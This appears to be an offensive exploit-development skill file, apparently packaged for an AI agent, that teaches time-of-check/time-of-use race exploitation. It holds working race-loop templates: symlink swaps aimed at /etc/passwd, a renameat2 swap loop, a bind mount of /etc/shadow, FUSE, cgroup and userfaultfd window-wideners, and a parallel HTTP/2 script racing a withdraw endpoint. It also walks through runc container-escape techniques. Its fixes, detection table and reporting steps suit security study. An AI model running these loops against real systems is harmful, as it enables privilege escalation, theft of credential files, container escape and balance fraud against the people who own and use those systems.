<!-- source: Claude-Red Skills/exploit-dev/offensive-toctou -->
<!-- fused into host package: pwn-chain -->

# TOCTOU — Time-of-Check / Time-of-Use Exploitation

A TOCTOU bug exists wherever code checks a property (file owner, path target, token validity, balance) and then acts on it as if the property still holds. Between check and use is a window — your job is to widen it and swap the underlying object.

## Quick Workflow

1. Identify the **check** (syscall, function, validation step) and the **use** (the privileged action)
2. Confirm the check and use don't operate on the same kernel object (FD, inode, atomic snapshot)
3. Build a primitive that swaps the object between check and use (symlink, mount, mv, parallel request)
4. **Widen the window** with FUSE, slow filesystems, scheduler tricks, or single-packet HTTP/2
5. Run a tight loop and confirm the post-use state corresponds to the swapped target

---

## The Core Pattern

```c
// Vulnerable
if (access(path, W_OK) == 0) {     // check  — resolves "path" now
    fd = open(path, O_WRONLY);     // use    — re-resolves "path" later
    write(fd, attacker_data, n);
}
```

Between `access` and `open`, an attacker replaces `path` with a symlink to `/etc/shadow`. The check sees an attacker-owned file; the use opens shadow as root.

The fix is always: **operate on the kernel object, not the path.** Use `O_NOFOLLOW`, `openat` with `AT_SYMLINK_NOFOLLOW`, `fstat` on the FD, etc.

---

## Filesystem TOCTOU

### Symlink Swap (Classic)

```bash
# Setup target — privileged binary that writes to user-supplied path after access() check
victim --output /tmp/.attacker/output

# Race loop
while true; do
  ln -sf /etc/passwd /tmp/.attacker/output 2>/dev/null
  ln -sf /tmp/.attacker/legit /tmp/.attacker/output 2>/dev/null
done &

# Run victim repeatedly
while true; do victim --output /tmp/.attacker/output; done
```

### renameat2(RENAME_EXCHANGE) — Atomic Single-Frame Swap

```c
syscall(SYS_renameat2, AT_FDCWD, "good", AT_FDCWD, "bad", RENAME_EXCHANGE);
```

`RENAME_EXCHANGE` swaps two paths atomically — combined with FUSE-paused dir lookups, this is a near-deterministic primitive on Linux ≥ 3.15.

### Directory Swap (mv between two prepared trees)

When the victim resolves `parent/file`, swap `parent` itself:

```bash
mv good_dir parent && mv evil_dir parent_was_good_dir
# If victim is mid-resolution of `parent/file`, dir cache may pin one side
```

### Bind Mount / Mount-Namespace Swap (root-only or in user-ns)

```bash
unshare -mUr
mkdir /tmp/x /tmp/y
echo benign > /tmp/x/file
mount --bind /etc/shadow /tmp/y/file
# Then: while true; do mount --move /tmp/x /tmp/m; mount --move /tmp/y /tmp/m; done
```

In containerized contexts with `CAP_SYS_ADMIN` in a user namespace, this is the foundation of multiple runc/CVE escape chains.

---

## Window-Widening Primitives

The race is always winnable in theory; in practice you need the window large enough for your swap.

### FUSE-Backed Slow Filesystem

Mount a FUSE filesystem you control. When the victim does `open` or `stat`, your handler sleeps:

```python
# fusepy
class SlowFS(Operations):
    def getattr(self, path, fh=None):
        if path == '/trigger':
            time.sleep(5)   # stretch the check
        return os.lstat(self.root + path).__dict__
```

Now the check call inside the victim blocks for 5 seconds — plenty of time to swap the post-check filename.

### Userfaultfd (kernel-level page faults)

```c
// Register a userfault region; when the victim reads the user-controlled buffer,
// pause it in the page-fault handler, swap data, then resume.
ioctl(uffd, UFFDIO_REGISTER, &reg);
```

`userfaultfd` can pause a kernel-side `copy_from_user` mid-read, enabling double-fetch wins. Linux ≥ 5.11 requires `vm.unprivileged_userfaultfd=1` (off by default in many distros).

### Cgroup Freeze

```bash
mkdir /sys/fs/cgroup/race
echo $victim_pid > /sys/fs/cgroup/race/cgroup.procs
echo 1 > /sys/fs/cgroup/race/cgroup.freeze   # pause
# swap files
echo 0 > /sys/fs/cgroup/race/cgroup.freeze   # resume
```

### Single-CPU Pinning + sched_yield

```c
cpu_set_t set; CPU_ZERO(&set); CPU_SET(0, &set);
sched_setaffinity(victim_pid, sizeof(set), &set);
// Race threads on same CPU — context switch is the only progress unit
```

---

## Kernel Double-Fetch

A kernel function reads the same userspace location twice; an attacker mutates it in between using userfaultfd or another thread.

```c
// Vulnerable kernel pattern
copy_from_user(&size, &user_arg->size, 4);   // first fetch
if (size > MAX) return -EINVAL;
copy_from_user(buf, user_arg->data, size);   // size re-fetched? Or from local? Check carefully.
```

Tooling: KFENCE, Bochspwn-Reloaded, DECAF — fuzzers and analyzers that detect double-fetches.

---

## /proc and procfs Races

### /proc/pid/exe + ptrace

`/proc/<pid>/exe` is a magic symlink. If a privileged binary opens it after fork+exec, an attacker can race the exec to point exe at attacker-controlled binary on a slow filesystem. Foundation of CVE-2019-5736 (runc).

```c
// Sketch
fd = open("/proc/self/exe", O_RDONLY);  // by attacker, in container
// Then the host runc opens /proc/<pid>/exe to write — opens *attacker's* exe → host RCE
```

### /proc/pid/mem

`open("/proc/pid/mem")` followed by `lseek+write` historically bypassed write protections. Modern kernels enforce ptrace credentials at write time, but legacy or patched-out checks still exist in embedded kernels.

### /proc/pid/cwd / fd / root

Symlinks resolve at deref time using the target task's namespace. Cross-namespace deref of `/proc/pid/root/etc/shadow` from a sibling container is a recurring vuln class.

---

## Setuid Binary TOCTOU

```c
// Vulnerable flow in classic SUID binary
if (!access(file, R_OK)) {       // check with real UID via access()
    fd = open(file, O_RDONLY);   // open with effective UID = root
    sendfile(stdout, fd, ...);
}
```

Symlink swap between `access` and `open` makes the binary read root-readable files for unprivileged users.

**Rule of thumb when reviewing setuid/setgid binaries:** every path appearing twice in a syscall trace is a candidate.

```bash
strace -f -e openat,access,stat,lstat,readlink ./suid_binary 2>&1 | grep "$user_input"
# Multiple resolutions of the same user-controlled path = TOCTOU surface
```

---

## Container Escape via TOCTOU

### CVE-2019-5736 (runc) — `/proc/self/exe` Overwrite

When a container runs `docker exec`, runc opens `/proc/self/exe` from the host. By replacing the in-container binary with a symlink to `/proc/self/exe`, the host runc rewrites itself.

### CVE-2024-21626 (runc "Leaky Vessels") — Working-Directory FD Leak

A leaked file descriptor to the host filesystem could be inherited via `WORKDIR /proc/self/fd/<n>` — the container's first process held a host FD, races on namespace setup let it act on host paths.

### Symlink-on-Mount Race

When the runtime resolves a bind-mount source/target path (e.g. for tmpfs setup), a fast attacker swaps a directory in the path with a symlink to `/`. Common in Kubernetes hostPath, Docker volumes, OpenShift SCC bypasses.

---

## Web / API TOCTOU

### Auth vs Authz Split at Gateway

```
Gateway: validates JWT (signature, exp) → forwards to service
Service: trusts gateway's "X-User-Id" header
```

If the JWT is revoked between gateway cache and gateway validation, or the gateway caches "valid" results too long, you get post-revocation access. Cache-key confusion (different gateway nodes) widens the window.

### Permission Recheck Skipped on Long-Running Action

```python
# Vulnerable
def long_export(user, resource_id):
    check_access(user, resource_id)        # check
    data = stream_resource(resource_id)    # use — minutes long
    return data                            # access could have been revoked mid-stream
```

Test: revoke access while a download is mid-stream; if data continues, recheck is missing.

### Idempotency-Key Reuse with Different Body

```http
POST /api/withdraw  Idempotency-Key: K1  { "amount": 1 }
POST /api/withdraw  Idempotency-Key: K1  { "amount": 1000 }   # Same key, different body
```

Many implementations key only on the key, not key+body-hash → second request returns the first's response while still processing the second's debit.

### Single-Packet Multi-Request

```
HTTP/2: hold N requests' DATA frames, send all END_STREAM in one TCP segment.
Server schedules N handlers concurrently with sub-millisecond skew → reliable race wins.
Tool: Burp Repeater "Send group in parallel (single-packet)".
```

This is the standard primitive for web TOCTOU since 2023; old `httpie ... &` parallelism is obsolete.

### Limit / Quota TOCTOU

```python
# Vulnerable
if user.balance >= amount:    # check
    user.balance -= amount    # use — non-atomic read-modify-write
    pay(user, amount)
```

Send N parallel requests, each sees the same pre-decrement balance. Fix: atomic decrement with constraint (`UPDATE ... WHERE balance >= amount`).

---

## Mobile / Binary Cookbook

### Android: Intent Redirect TOCTOU

Activity checks calling package via `getCallingPackage()` then dispatches via Intent — between check and dispatch, attacker swaps the underlying ContentProvider URI authority resolution.

### iOS: NSXPC Audit Token Confusion

`audit_token_t` should be captured at the start of each XPC message handling. If the service captures it once and reuses, an attacker can race PID reuse to impersonate.

---

## Detection & Tooling

| Tool | Layer | Use |
|------|-------|-----|
| `strace -e trace=file -f` | Linux syscall | Find duplicate path resolutions |
| `bpftrace` / `bcc` | Kernel | Probe specific syscalls' args at scale |
| ThreadSanitizer (TSan) | Userspace C/C++ | Compile-time race detection |
| Helgrind / DRD | Userspace | Pthread race detection |
| Bochspwn-Reloaded | Kernel | Double-fetch detection |
| `syzkaller` | Kernel | Coverage-guided race fuzzing |
| Burp Suite (Repeater single-packet) | Web/HTTP | Concurrent request races |
| `racepwn` | Web | Multi-thread + timing harness |
| `Turbo Intruder` | Web | Pipelined parallel requests |

```bash
# Quick filesystem TOCTOU finder against a binary
strace -f -e trace=file ./target 2>&1 | \
  awk -F'"' '/access|stat|lstat|open|readlink/ {print $2}' | \
  sort | uniq -c | sort -rn | head
# Paths appearing N>1 times → TOCTOU candidates
```

---

## Race Loop Templates

### Filesystem (C)

```c
#include <sys/syscall.h>
#include <linux/fs.h>
int main() {
    pid_t p = fork();
    if (!p) { for(;;) syscall(SYS_renameat2, -100,"a",-100,"b",RENAME_EXCHANGE); }
    for(;;) execve(victim, args, env);
}
```

### Web (Python — single-packet HTTP/2)

```python
# Use httpx or h2 directly; pyburp or turbo-intruder for production
import httpx, anyio
async def race():
    async with httpx.AsyncClient(http2=True) as c:
        async with anyio.create_task_group() as tg:
            for _ in range(30):
                tg.start_soon(c.post, "https://app/withdraw", json={"amount": 100})
anyio.run(race)
```

For real reliability on TLS, prefer Burp's single-packet feature — it crafts an HTTP/2 last-byte synchronization.

---

## Reporting / Severity

A TOCTOU finding's severity rests on: window size (deterministic vs probabilistic), required adjacency (local user / container / authenticated remote), and the post-use primitive (file write, auth bypass, money). A "1-in-10000 race that gives root" is the same finding as a "deterministic race that gives root" once it's chained with a window-widening primitive. Always demonstrate:

1. The minimum reproducer
2. The window-widener used
3. The success rate observed
4. The post-exploit primitive achieved

---

## Key References

- MITRE CWE-367 (TOCTOU), CWE-362 (Race Condition)
- USENIX Security: "FUSE for Profit" — TOCTOU window-widening
- PortSwigger Research: "Smashing the state machine" (single-packet HTTP/2 attack)
- runc CVE-2019-5736, CVE-2024-21626 advisories
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/toctou.md
